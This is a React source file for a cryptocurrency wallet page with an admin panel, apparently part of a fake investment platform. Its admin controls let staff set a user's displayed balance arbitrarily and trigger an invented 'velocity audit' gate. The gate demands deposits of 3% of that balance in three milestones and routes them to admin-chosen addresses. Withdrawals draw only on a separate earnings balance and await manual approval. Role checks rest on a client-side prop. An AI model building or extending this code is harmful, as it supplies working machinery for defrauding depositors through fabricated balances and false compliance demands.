'use client';

import React, { useState, useEffect } from 'react';
import { 
  Copy, QrCode, ArrowUpRight, ArrowDownRight, CheckCircle2, 
  AlertCircle, Clock, XCircle, Loader2, Eye, EyeOff, ShieldAlert, Check, X 
} from 'lucide-react';
import { toast } from 'sonner';
import { supabase } from '@/lib/supabase';
import { Profile, Transaction } from '@/hooks/useRealtime';

interface UserWalletViewProps {
  profile: Profile;
  transactions: Transaction[];
  staffRole?: 'admin' | 'sub-admin' | 'user'; // Dynamic permission layer injection
}

export default function UserWalletView({ profile, transactions, staffRole = 'user' }: UserWalletViewProps) {
  const [activeTab, setActiveTab] = useState<'deposit' | 'withdraw' | 'history'>('deposit');
  const [submitting, setSubmitting] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<string>('wallet-usdt-trc');
  const [revealAddress, setRevealAddress] = useState(false);
  
  // Form States
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [withdrawAsset, setWithdrawAsset] = useState('USDT-TRC20');

  // Admin Overwrite Panel Local States
  const [adminThreshold, setAdminThreshold] = useState('');
  const [adminRequiredVolume, setAdminRequiredVolume] = useState('');
  const [adminMainBalance, setAdminMainBalance] = useState('');
  const [adminCustomAddress, setAdminCustomAddress] = useState('');
  const [adminUpgradeToggle, setAdminUpgradeToggle] = useState(false);
  const [updatingDb, setUpdatingDb] = useState(false);
  const [processingTxId, setProcessingTxId] = useState<string | null>(null);

  // Sync state values when profile changes
  useEffect(() => {
    if (profile) {
      setAdminThreshold(String(profile.velocity_threshold || 500000));
      setAdminRequiredVolume(String(profile.required_volume || ''));
      setAdminMainBalance(String(profile.main_balance || 0));
      setAdminCustomAddress(profile.crypto_deposit_address || '');
      setAdminUpgradeToggle(!!profile.upgrade_required);
    }
  }, [profile]);

  // Automatically conceal addresses when swapping networks
  useEffect(() => {
    setRevealAddress(false);
  }, [selectedWallet]);

  // Dynamic Gate Calculations
  const accountAgeMonths = () => {
    if (!profile?.created_at) return 0;
    const created = new Date(profile.created_at);
    const now = new Date();
    return (now.getFullYear() - created.getFullYear()) * 12 + (now.getMonth() - created.getMonth());
  };

  const activeThreshold = profile?.velocity_threshold || 500000;
  const currentBalance = Number(profile?.main_balance || 0);
  
  const isVelocityBreached = profile?.upgrade_required || (currentBalance > activeThreshold && accountAgeMonths() < 5);
  const totalRequired = profile?.required_volume || (currentBalance * 0.03);
  const splitMilestoneAmount = totalRequired / 3;

  // Admin Master Target Wallets Configuration (Incorporate dynamic overriding fallback)
  const depositAddresses = [
    {
      id: 'wallet-btc', asset: 'BTC', network: 'Bitcoin', address: profile?.crypto_deposit_address || 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
      minDeposit: 0.001, confirmations: 3, color: '#F7931A', icon: '₿',
    },
    {
      id: 'wallet-eth', asset: 'ETH', network: 'Ethereum (ERC-20)', address: profile?.crypto_deposit_address || '0x742d35Cc6634C0532925a3b8D4C9C2e4e1234567',
      minDeposit: 0.01, confirmations: 12, color: '#627EEA', icon: 'Ξ',
    },
    {
      id: 'wallet-usdt-trc', asset: 'USDT', network: 'TRON (TRC-20)', address: profile?.crypto_deposit_address || 'TRx8QVbMJMHkJZJvEBnFjY9KnE1234567890',
      minDeposit: 50, confirmations: 20, color: '#26A17B', icon: '₮',
    },
    {
      id: 'wallet-usdt-erc', asset: 'USDT', network: 'Ethereum (ERC-20)', address: profile?.crypto_deposit_address || '0x8B4A1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B',
      minDeposit: 50, confirmations: 12, color: '#26A17B', icon: '₮',
    },
  ];

  const currentWallet = depositAddresses.find((w) => w.id === selectedWallet) || depositAddresses[2];
  const earningsBalance = Number(profile?.earnings_balance || 0);

  const walletHistory = [...transactions]
    .filter(tx => tx.type === 'deposit' || tx.type === 'withdrawal')
    .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

  const copyAddress = (addr: string) => {
    navigator.clipboard.writeText(addr).catch(() => {});
    toast.success('Address copied to clipboard');
  };

  // Profile Overwrite System Operations
  const handleUpdateProfileRules = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!profile?.id) return;

    try {
      setUpdatingDb(true);
      
      const payload: any = {
        velocity_threshold: Number(adminThreshold),
        required_volume: adminRequiredVolume ? Number(adminRequiredVolume) : null,
        crypto_deposit_address: adminCustomAddress.trim() || null,
        upgrade_required: adminUpgradeToggle
      };

      // Restrict Main Balance adjustments to Super Admin clearances only
      if (staffRole === 'admin') {
        payload.main_balance = Number(adminMainBalance);
      }

      const { error } = await supabase
        .from('profiles')
        .update(payload)
        .eq('id', profile.id);

      if (error) throw error;
      toast.success('Account parameter configurations synchronized successfully!');
    } catch (err: any) {
      console.error(err);
      toast.error(err.message || 'Failed to modify parameter tables.');
    } finally {
      setUpdatingDb(false);
    }
  };

  // Ledger Verification Settlement Pipeline (Approve/Reject)
  const handleModifyTransactionStatus = async (txId: string, action: 'completed' | 'rejected') => {
    try {
      setProcessingTxId(txId);
      
      let reason = '';
      if (action === 'rejected') {
        const promptInput = window.prompt('Provide rejection trace clarification message:');
        if (promptInput === null) return; // User canceled out
        reason = promptInput || 'Failed framework clearing specifications.';
      }

      const { error } = await supabase
        .from('transactions')
        .update({
          status: action,
          rejection_reason: action === 'rejected' ? reason : null
        })
        .eq('id', txId);

      if (error) throw error;
      toast.success(`Transaction sequence successfully marked as ${action}`);
    } catch (err: any) {
      console.error(err);
      toast.error(err.message || 'Transaction settlement write execution failed.');
    } finally {
      setProcessingTxId(null);
    }
  };

  const handleWithdrawalSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const amountNum = Number(withdrawAmount);
    if (!withdrawAmount || amountNum <= 0) {
      toast.error('Please input a valid transaction amount.');
      return;
    }
    if (!withdrawAddress.trim()) {
      toast.error('Destination wallet clearance address is required.');
      return;
    }
    if (amountNum > earningsBalance) {
      toast.error('Insufficient available funds inside your current accrued earnings balance.');
      return;
    }

    try {
      setSubmitting(true);
      const { error } = await supabase.from('transactions').insert([
        {
          user_id: profile.id,
          type: 'withdrawal',
          amount: amountNum,
          asset: withdrawAsset,
          status: 'pending',
          tx_hash: 'Awaiting Blockchain Broadcast...',
          confirmations: 0,
          usd_value: amountNum,
        }
      ]);

      if (error) throw error;

      toast.success('Withdrawal execution trace recorded! Awaiting admin confirmation pipeline.');
      setWithdrawAmount('');
      setWithdrawAddress('');
      setActiveTab('history');
    } catch (err: any) {
      console.error(err);
      toast.error(err.message || 'System failed to write verification block.');
    } finally {
      setSubmitting(false);
    }
  };

  function StatusBadge({ tx }: { tx: Transaction }) {
    if (tx.status === 'rejected') {
      return (
        <span className="inline-flex items-center px-2 py-0.5 rounded-md text-xs font-medium bg-danger/10 text-danger border border-danger/20">
          <XCircle size={10} className="mr-1" /> Rejected
        </span>
      );
    }
    if (tx.status === 'completed') {
      return (
        <span className="inline-flex items-center px-2 py-0.5 rounded-md text-xs font-medium bg-success/10 text-success border border-success/20">
          <CheckCircle2 size={10} className="mr-1" /> Completed
        </span>
      );
    }
    return (
      <span className="inline-flex items-center px-2 py-0.5 rounded-md text-xs font-medium bg-warning/10 text-warning border border-warning/20">
        <Clock size={10} className="mr-1 animate-pulse" /> Pending
      </span>
    );
  }

  return (
    <div className="space-y-6 fade-in">
      
      {/* ADMINISTRATIVE OVERLAY INTERFACE BOARD */}
      {(staffRole === 'admin' || staffRole === 'sub-admin') && (
        <div className="bg-slate-950 border-2 border-indigo-500/30 p-6 rounded-2xl shadow-2xl space-y-6">
          <div className="flex items-center justify-between border-b border-slate-800 pb-4">
            <div className="flex items-center gap-2 text-indigo-400">
              <ShieldAlert className="w-5 h-5" />
              <div>
                <h3 className="text-sm font-bold uppercase tracking-wider text-white">Back-Office Wallet Management Matrix</h3>
                <p className="text-xs text-slate-400">Clearance Authorization Rank: <span className="text-indigo-400 uppercase font-bold font-mono">[{staffRole}]</span></p>
              </div>
            </div>
          </div>

          <form onSubmit={handleUpdateProfileRules} className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-4 items-end">
            <div>
              <label className="block text-[11px] font-mono uppercase tracking-wider text-slate-400 mb-1.5">Velocity Limit Range</label>
              <input 
                type="number"
                value={adminThreshold}
                onChange={(e) => setAdminThreshold(e.target.value)}
                className="w-full px-3 py-2 bg-slate-900 border border-slate-800 text-xs text-white font-mono rounded-lg focus:outline-none focus:border-indigo-500"
              />
            </div>

            <div>
              <label className="block text-[11px] font-mono uppercase tracking-wider text-slate-400 mb-1.5">Override Milestone Vol (USD)</label>
              <input 
                type="number"
                value={adminRequiredVolume}
                onChange={(e) => setAdminRequiredVolume(e.target.value)}
                placeholder="Auto (3% of total)"
                className="w-full px-3 py-2 bg-slate-900 border border-slate-800 text-xs text-white font-mono rounded-lg focus:outline-none focus:border-indigo-500"
              />
            </div>

            <div>
              <label className="block text-[11px] font-mono uppercase tracking-wider text-slate-400 mb-1.5">Main Account Balance</label>
              <input 
                type="number"
                value={adminMainBalance}
                onChange={(e) => setAdminMainBalance(e.target.value)}
                disabled={staffRole !== 'admin'}
                className="w-full px-3 py-2 bg-slate-900 border border-slate-800 text-xs text-white font-mono rounded-lg focus:outline-none focus:border-indigo-500 disabled:opacity-40 disabled:cursor-not-allowed"
              />
            </div>

            <div>
              <label className="block text-[11px] font-mono uppercase tracking-wider text-slate-400 mb-1.5">Custom Destination Routing</label>
              <input 
                type="text"
                value={adminCustomAddress}
                onChange={(e) => setAdminCustomAddress(e.target.value)}
                placeholder="Dynamic address overwrite"
                className="w-full px-3 py-2 bg-slate-900 border border-slate-800 text-xs text-white font-mono rounded-lg focus:outline-none focus:border-indigo-500"
              />
            </div>

            <div className="flex gap-3 h-9 items-center justify-between xl:justify-start">
              <label className="flex items-center gap-2 cursor-pointer select-none text-xs text-slate-300 font-medium">
                <input 
                  type="checkbox"
                  checked={adminUpgradeToggle}
                  onChange={(e) => setAdminUpgradeToggle(e.target.checked)}
                  className="rounded border-slate-800 bg-slate-900 text-indigo-600 focus:ring-0 w-4 h-4"
                />
                Force Breach Gate
              </label>

              <button
                type="submit"
                disabled={updatingDb}
                className="px-4 py-2 bg-indigo-600 text-white font-semibold text-xs rounded-lg hover:bg-indigo-500 transition-colors flex items-center gap-1 shrink-0 ml-auto"
              >
                {updatingDb && <Loader2 size={12} className="animate-spin" />}
                Sync Setup
              </button>
            </div>
          </form>
        </div>
      )}

      {/* ACTIVE VERIFICATION LAYER ALERT MESSAGEBOX */}
      {isVelocityBreached && (
        <div className="bg-gradient-to-br from-slate-950 to-primary/10 border border-primary/20 p-5 rounded-2xl shadow-xl flex items-start gap-4">
          <div className="p-2 bg-primary/10 text-primary rounded-xl border border-primary/20 shrink-0">
            <ShieldAlert className="w-5 h-5" />
          </div>
          <div>
            <h3 className="text-sm font-bold uppercase tracking-wider text-foreground mb-1">Active Settlement Framework Gates Engaged</h3>
            <p className="text-xs text-muted-foreground leading-relaxed">
              The institution's transaction velocity auditing engines have triggered settlement clearance restrictions on this node account pipeline. 
              To lift active barriers, fulfill your milestone volume configuration paths dynamically listed below.
            </p>
          </div>
        </div>
      )}

      <div className="flex items-center gap-4">
        {(['deposit', 'withdraw', 'history'] as const).map((tab) => (
          <button
            key={`wallet-tab-${tab}`}
            onClick={() => setActiveTab(tab)}
            className={`px-4 py-2 rounded-lg text-sm font-semibold transition-all duration-150 ${
              activeTab === tab ? 'bg-primary text-white' : 'btn-secondary'
            }`}
          >
            {tab.charAt(0).toUpperCase() + tab.slice(1)}
          </button>
        ))}
      </div>

      {activeTab === 'deposit' && (
        <div className="grid grid-cols-1 xl:grid-cols-5 gap-6">
          <div className="xl:col-span-2 space-y-3">
            <h3 className="text-sm font-semibold text-foreground">Select Network</h3>
            {depositAddresses.map((w) => (
              <button
                key={w.id}
                onClick={() => setSelectedWallet(w.id)}
                className={`
                  w-full flex items-center gap-3 p-4 rounded-xl border text-left transition-all duration-150
                  ${selectedWallet === w.id ? 'border-primary bg-primary/5' : 'border-border bg-card hover:border-border/80'}
                `}
                style={{
                  boxShadow: selectedWallet === w.id ? `0 0 0 1px var(--primary), 0 4px 16px rgba(232,80,10,0.1)` : undefined,
                }}
              >
                <div
                  className="w-10 h-10 rounded-full flex items-center justify-center text-lg font-bold shrink-0"
                  style={{ backgroundColor: `${w.color}18`, color: w.color }}
                >
                  {w.icon}
                </div>
                <div>
                  <div className="text-sm font-semibold text-foreground">{w.asset}</div>
                  <div className="text-xs text-muted-foreground">{w.network}</div>
                </div>
                {selectedWallet === w.id && (
                  <CheckCircle2 size={16} className="text-primary ml-auto shrink-0" />
                )}
              </button>
            ))}
          </div>

          <div className="xl:col-span-3 rounded-xl border border-border bg-card p-6 flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between gap-3 mb-6">
                <div className="flex items-center gap-3">
                  <div
                    className="w-12 h-12 rounded-xl flex items-center justify-center text-2xl font-bold"
                    style={{ backgroundColor: `${currentWallet.color}18`, color: currentWallet.color }}
                  >
                    {currentWallet.icon}
                  </div>
                  <div>
                    <h3 className="text-base font-bold text-foreground">Deposit {currentWallet.asset}</h3>
                    <p className="text-sm text-muted-foreground">{currentWallet.network}</p>
                  </div>
                </div>

                <button
                  onClick={() => setRevealAddress(!revealAddress)}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium bg-muted hover:bg-muted/80 text-foreground transition-colors border border-border"
                >
                  {revealAddress ? (
                    <><EyeOff size={13} /> Hide Details</>
                  ) : (
                    <><Eye size={13} /> Reveal Details</>
                  )}
                </button>
              </div>

              {/* RENDER FRACTIONAL SPLIT BOXES IF DYNAMICALLY BREACHED */}
              {isVelocityBreached ? (
                <div className="space-y-4 mb-4">
                  <div className="p-4 bg-muted/50 border border-border rounded-xl">
                    <div className="flex justify-between items-center text-xs text-muted-foreground mb-2">
                      <span>Dynamic 1/3 Milestone Fractional Step Target</span>
                      <span className="text-[10px] bg-primary/10 text-primary px-2 py-0.5 rounded font-mono border border-primary/20">Precision Metric</span>
                    </div>
                    <div className="flex items-center justify-between bg-card px-4 py-3 rounded-lg border border-border">
                      <span className="font-mono text-base font-bold text-foreground">
                        ${splitMilestoneAmount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 4 })}
                      </span>
                      <button
                        onClick={() => copyAddress(splitMilestoneAmount.toFixed(4))}
                        className="text-xs font-medium text-primary hover:underline flex items-center gap-1 pl-3 border-l border-border"
                      >
                        <Copy size={12} /> Copy Amount
                      </button>
                    </div>
                  </div>

                  {revealAddress ? (
                    <div className="p-4 bg-muted/50 border border-border rounded-xl space-y-4">
                      <div className="w-32 h-32 mx-auto bg-white p-2 border border-border rounded-lg flex items-center justify-center">
                        <QrCode size={110} className="text-slate-900" />
                      </div>
                      <div className="flex items-center justify-between bg-card px-4 py-3 rounded-lg border border-border">
                        <span className="font-mono text-xs text-foreground flex-1 break-all pr-2 select-all leading-relaxed">
                          {currentWallet.address}
                        </span>
                        <button
                          onClick={() => copyAddress(currentWallet.address)}
                          className="text-primary hover:text-primary/80 shrink-0"
                        >
                          <Copy size={14} />
                        </button>
                      </div>
                    </div>
                  ) : (
                    <div className="h-36 border border-dashed border-border rounded-xl flex flex-col items-center justify-center bg-muted/20 text-center p-4">
                      <AlertCircle size={20} className="text-muted-foreground mb-1.5" />
                      <p className="text-xs font-semibold text-foreground mb-2">Secure Core Target Wallet Masked</p>
                      <button
                        onClick={() => setRevealAddress(true)}
                        className="px-3 py-1.5 bg-primary text-white text-xs font-semibold rounded-lg"
                      >
                        Generate Parameters
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                /* STANDALONE CONVENTIONAL ACCOUNT SCREEN DECK */
                <>
                  {revealAddress ? (
                    <div className="space-y-6 mb-4">
                      <div className="w-40 h-40 mx-auto rounded-xl flex items-center justify-center bg-white p-2 border border-border shadow-sm">
                        <QrCode size={120} className="text-slate-900" />
                      </div>

                      <div className="p-3 rounded-xl flex items-center gap-3 bg-muted border border-border">
                        <span className="font-mono text-xs text-foreground flex-1 break-all leading-relaxed select-all">
                          {currentWallet.address}
                        </span>
                        <button
                          onClick={() => copyAddress(currentWallet.address)}
                          className="p-2 text-muted-foreground hover:text-foreground hover:bg-card rounded-md transition-colors border border-transparent hover:border-border"
                        >
                          <Copy size={14} />
                        </button>
                      </div>
                    </div>
                  ) : (
                    <div className="h-48 border border-dashed border-border rounded-xl flex flex-col items-center justify-center bg-muted/40 p-6 text-center mb-4">
                      <AlertCircle size={24} className="text-muted-foreground mb-2" />
                      <p className="text-sm font-medium text-foreground mb-1">Secure Destination Gateway Masked</p>
                      <p className="text-xs text-muted-foreground max-w-xs mb-3">
                        Verify network properties before requesting access parameters.
                      </p>
                      <button
                        onClick={() => setRevealAddress(true)}
                        className="px-4 py-2 bg-primary text-white text-xs font-semibold rounded-lg hover:bg-primary/90 transition-colors"
                      >
                        Generate Credentials
                      </button>
                    </div>
                  )}
                </>
              )}

              <div className="grid grid-cols-2 gap-3 my-4">
                {[
                  { label: 'Min Deposit', value: `${currentWallet.minDeposit} ${currentWallet.asset}` },
                  { label: 'Network Confirmations', value: `${currentWallet.confirmations} required` },
                ].map((info) => (
                  <div key={`wallet-info-${info.label}`} className="p-3 rounded-lg bg-muted border border-border/60">
                    <div className="text-xs text-muted-foreground mb-1--------------">{info.label}</div>
                    <div className="font-mono text-sm font-semibold text-foreground">{info.value}</div>
                  </div>
                ))}
              </div>
            </div>

            <div className="flex items-start gap-2.5 p-3 rounded-xl bg-warning/5 border border-warning/20 mt-auto">
              <AlertCircle size={14} className="text-warning shrink-0 mt-0.5" />
              <p className="text-xs text-warning leading-relaxed">
                Only send **{currentWallet.asset}** on the **{currentWallet.network}** network. Cross-chain mismatch errors will result in permanent loss.
              </p>
            </div>
          </div>
        </div>
      )}

      {activeTab === 'withdraw' && (
        <div className="max-w-xl">
          <form onSubmit={handleWithdrawalSubmit} className="rounded-xl border border-border bg-card p-6 space-y-5">
            <div>
              <h3 className="text-base font-semibold text-foreground mb-1">Withdraw Funds</h3>
              <p className="text-sm text-muted-foreground">
                Processing allocation loops complete dynamically within standard ledger checking metrics.
              </p>
            </div>

            <div>
              <label className="block text-sm font-medium text-foreground mb-2">Select Asset Network Profile</label>
              <select
                value={withdrawAsset}
                onChange={(e) => setWithdrawAsset(e.target.value)}
                className="w-full px-4 py-3 text-sm bg-muted border border-border rounded-lg text-foreground focus:outline-none focus:border-primary transition-colors"
              >
                <option value="USDT-TRC20">USDT — TRON (TRC-20)</option>
                <option value="USDT-ERC20">USDT — Ethereum (ERC-20)</option>
                <option value="ETH">ETH — Ethereum Network</option>
                <option value="BTC">BTC — Bitcoin Core Layer</option>
              </select>
            </div>

            <div>
              <div className="flex justify-between items-center mb-2">
                <label className="text-sm font-medium text-foreground">Amount (USD)</label>
                <span className="text-xs text-primary font-mono font-semibold">
                  Available: ${earningsBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </span>
              </div>
              <input
                type="number"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                className="w-full px-4 py-3 text-sm font-mono bg-muted border border-border rounded-lg text-foreground focus:outline-none focus:border-primary transition-colors"
                placeholder="Minimum $100 entry"
                min={100}
                disabled={submitting}
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-foreground mb-2">Destination Wallet Address</label>
              <input
                type="text"
                value={withdrawAddress}
                onChange={(e) => setWithdrawAddress(e.target.value)}
                className="w-full px-4 py-3 text-sm font-mono bg-muted border border-border rounded-lg text-foreground focus:outline-none focus:border-primary transition-colors"
                placeholder="Paste external target chain address network payload"
                disabled={submitting}
              />
            </div>

            <div className="flex items-start gap-2.5 p-3 rounded-xl bg-info/5 border border-info/20">
              <AlertCircle size={14} className="text-info shrink-0 mt-0.5" />
              <p className="text-xs text-info leading-relaxed">
                Ensure external matching fields correlate perfectly. Network broadcast arrays are unalterable following deployment approval.
              </p>
            </div>

            <button 
              type="submit" 
              disabled={submitting}
              className="w-full py-3 bg-primary text-white hover:bg-primary/95 disabled:opacity-50 text-sm font-semibold flex items-center justify-center gap-2 rounded-lg transition-colors"
            >
              {submitting ? (
                <><Loader2 size={16} className="animate-spin" /> Broadcasting Ledger Segment...</>
              ) : (
                <><ArrowUpRight size={16} /> Submit Withdrawal Request</>
              )}
            </button>
          </form>
        </div>
      )}

      {activeTab === 'history' && (
        <div className="rounded-xl border border-border bg-card overflow-hidden">
          <div className="px-5 py-4 border-b border-border">
            <h3 className="text-sm font-semibold text-foreground">Wallet Transaction Ledger</h3>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b border-border bg-muted/30">
                  {['Type', 'Asset', 'Amount', 'USD Value', 'TX Trace Info', 'Status', 'Date', ...(staffRole === 'admin' || staffRole === 'sub-admin' ? ['Management Operations'] : [])].map((col) => (
                    <th key={`wh-col-${col}`} className="px-5 py-3 text-left text-xs font-medium text-muted-foreground uppercase tracking-wider whitespace-nowrap">
                      {col}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody className="divide-y divide-border">
                {walletHistory.length === 0 ? (
                  <tr>
                    <td colSpan={staffRole !== 'user' ? 8 : 7} className="px-5 py-10 text-center text-xs font-medium text-muted-foreground">
                      No matching historical statement records found for this account pipeline.
                    </td>
                  </tr>
                ) : (
                  walletHistory.map((tx) => {
                    const txDate = new Date(tx.created_at).toLocaleDateString(undefined, { dateStyle: 'medium' });
                    const isWithdrawal = tx.type === 'withdrawal';
                    
                    return (
                      <tr key={tx.id} className="hover:bg-muted/30 transition-colors">
                        <td className="px-5 py-3">
                          <div className="flex items-center gap-2">
                            {isWithdrawal ? (
                              <ArrowUpRight size={14} className="text-danger" />
                            ) : (
                              <ArrowDownRight size={14} className="text-success" />
                            )}
                            <span className="text-sm capitalize font-medium text-foreground">{tx.type}</span>
                          </div>
                        </td>
                        <td className="px-5 py-3 text-sm text-muted-foreground uppercase font-semibold">{tx.asset || 'USDT'}</td>
                        <td className="px-5 py-3 font-mono text-sm font-semibold text-foreground">
                          {isWithdrawal ? '-' : '+'}{Number(tx.amount || 0).toLocaleString()}
                        </td>
                        <td className="px-5 py-3 font-mono text-sm text-foreground">
                          ${Number(tx.usd_value || tx.amount || 0).toLocaleString(undefined, { minimumFractionDigits: 2 })}
                        </td>
                        <td className="px-5 py-3 max-w-[180px]">
                          <div className="font-mono text-xs text-muted-foreground truncate" title={tx.tx_hash || undefined}>
                            {tx.tx_hash}
                          </div>
                        </td>
                        <td className="px-5 py-3">
                          <div className="flex flex-col gap-1">
                            <StatusBadge tx={tx} />
                            {tx.status === 'rejected' && tx.rejection_reason && (
                              <span className="text-[10px] text-danger bg-danger/5 p-1 rounded border border-danger/10 max-w-[200px] leading-relaxed">
                                <strong>Reason:</strong> {tx.rejection_reason}
                              </span>
                            )}
                          </div>
                        </td>
                        <td className="px-5 py-3 text-sm text-muted-foreground whitespace-nowrap">{txDate}</td>
                        
                        {/* INLINE ADMIN CLEARING PLATFORM BUTTONS */}
                        {(staffRole === 'admin' || staffRole === 'sub-admin') && (
                          <td className="px-5 py-3 whitespace-nowrap">
                            {tx.status === 'pending' ? (
                              <div className="flex items-center gap-1.5">
                                <button
                                  disabled={processingTxId !== null}
                                  onClick={() => handleModifyTransactionStatus(tx.id, 'completed')}
                                  className="p-1 text-emerald-500 hover:bg-emerald-500/10 border border-transparent hover:border-emerald-500/20 rounded transition-colors"
                                  title="Approve Settlement"
                                >
                                  {processingTxId === tx.id ? <Loader2 size={14} className="animate-spin" /> : <Check size={14} />}
                                </button>
                                <button
                                  disabled={processingTxId !== null || staffRole === 'sub-admin'}
                                  onClick={() => handleModifyTransactionStatus(tx.id, 'rejected')}
                                  className="p-1 text-rose-500 hover:bg-rose-500/10 border border-transparent hover:border-rose-500/20 rounded transition-colors disabled:opacity-30 disabled:cursor-not-allowed"
                                  title={staffRole === 'sub-admin' ? "Requires Super Admin clearance" : "Reject Sequence"}
                                >
                                  <X size={14} />
                                </button>
                              </div>
                            ) : (
                              <span className="text-[10px] text-muted-foreground font-mono uppercase tracking-wider">Settled</span>
                            )}
                          </td>
                        )}
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
}